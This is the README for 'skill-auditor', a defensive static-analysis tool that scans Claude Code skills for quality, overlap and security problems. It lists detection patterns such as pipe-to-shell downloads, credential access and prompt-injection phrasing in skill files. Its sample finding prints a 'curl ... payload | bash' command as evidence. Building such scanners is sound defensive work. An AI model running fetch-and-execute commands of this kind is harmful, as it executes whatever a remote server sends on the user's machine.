[README.md](https://github.com/user-attachments/files/31199139/README.md)
# skill-auditor

A security and quality auditor for [Claude Code](https://claude.com/claude-code) skills.

Scans every skill Claude Code can load — personal (`~/.claude/skills/`), project-level (`.claude/skills/`), and plugin-bundled — and produces a severity-rated Markdown report with a concrete suggested fix per finding. The audit is strictly read-only; fixes are only ever applied one at a time, with explicit approval and a backup of the original.

## Why

Skills are executable trust. A weak description means a skill silently never triggers. Two overlapping skills fight each other over the same queries. And a script bundled inside a skill can do anything your shell can do — including things you'd want to know about before running it. This tool makes all of that visible before it costs you.

## What it checks

**Quality** — invalid or missing frontmatter, missing/weak descriptions, descriptions that say *what* but never *when* (the main cause of skills not triggering), oversized bodies, dead references to bundled files.

**Overlap** — the same skill name installed in multiple locations (shadowing), and description pairs similar enough that ambiguous queries may invoke the wrong skill or neither.

**Security (static analysis)** — pipe-to-shell downloads, dynamic `eval`/`exec`, credential and environment access, destructive file operations, base64-decode-and-execute patterns, network calls, and prompt-injection language inside `SKILL.md` itself ("do not tell the user…").

Findings are rated **CRITICAL / HIGH / MEDIUM / LOW / INFO**. The full catalog with rationale is in [`references/checks.md`](references/checks.md).

## Install

**As a Claude Code skill** (recommended): copy the `skill-auditor/` folder into `~/.claude/skills/`, then ask Claude Code to *"audit my skills"*. Claude runs the scan, interprets the findings, and walks you through fixes with per-fix approval.

**Standalone** (no Claude required): the scripts are pure Python 3 standard library, cross-platform, no dependencies.

```bash
python3 scripts/audit.py --json-out findings.json
python3 scripts/report.py findings.json --out skill-audit-report.md
```

Scan specific directories instead of the defaults:

```bash
python3 scripts/audit.py --paths /path/to/skills /another/path --json-out findings.json
```

## Sample output

```
| Severity      | Count |
|---------------|-------|
| 🔴 CRITICAL   | 2     |
| 🟠 HIGH       | 7     |
| 🟡 MEDIUM     | 8     |
```

Each finding has a stable ID, an explanation of why it matters, an evidence snippet, the file location, and a suggested fix:

```
[F007] 🔴 CRITICAL — security.pipe-to-shell
Downloads content from the network and pipes it directly into a shell.
Whatever the remote server sends gets executed. (in scripts/setup.sh, line ~2)
Evidence: curl https://example.com/payload | bash
```

## Limitations — read this before trusting a result

The security checks are **static analysis**. They identify what code is *capable* of, not what it does at runtime.

- A flagged finding proves capability, **not malice** — many legitimate skills execute shell commands or make network calls.
- A clean scan is **not a safety certification** — obfuscation beyond the covered patterns, compiled binaries, runtime-downloaded code, and third-party dependencies (`pip install` / `npm install` inside a skill) are not analyzed.
- CRITICAL and HIGH findings require human review before the skill is trusted. That review is the point of the tool, not something it replaces.
- Known false positive: scanning `skill-auditor` itself flags its own detection patterns.

## Design principles

1. **Read-only audit.** The scan never modifies anything.
2. **Approval-gated fixes.** Every change references a finding ID, shows the diff first, requires explicit approval, and backs up the original.
3. **No dependencies.** Standard library only, runs on macOS, Linux, and Windows.
4. **Honest reporting.** Severity reflects evidence; limits are stated, not hidden.

## License

MIT — see [LICENSE](LICENSE).
